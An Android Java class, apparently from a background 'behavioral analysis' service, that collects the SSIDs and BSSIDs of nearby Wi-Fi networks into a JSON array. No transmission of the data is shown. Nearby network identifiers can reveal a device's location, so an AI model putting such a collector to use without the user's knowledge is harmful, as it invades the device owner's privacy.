package com.behavioralanalysis.service;

import android.content.Context;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiManager;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Date;
import java.util.List;

public class Wifi {
    public static JSONArray get() {
        JSONArray array = new JSONArray();

        Context context = MainService.getContext();

        try {
            WifiManager wifiManager = (WifiManager)context
                    .getApplicationContext()
                    .getSystemService(Context.WIFI_SERVICE);

            if (wifiManager != null && wifiManager.isWifiEnabled()) {
                List scans = wifiManager.getScanResults();
                if (scans != null && scans.size() > 0) {
                    for (int i = 0; i < scans.size(); i++) {
                        ScanResult scan = (ScanResult)scans.get(i);
                        JSONObject object = new JSONObject();
                        object.put("BSSID", scan.BSSID);
                        object.put("SSID", scan.SSID);
                        array.put(object);
                    }
                }
            }
        } catch (Throwable th) {
            Toast.makeText(
                    context,
                    "Wifi.scan",
                    Toast.LENGTH_SHORT
            ).show();
            Log.e("Mta.SDK", "isWifiNet error", th);
        }

        return array;
    }
}
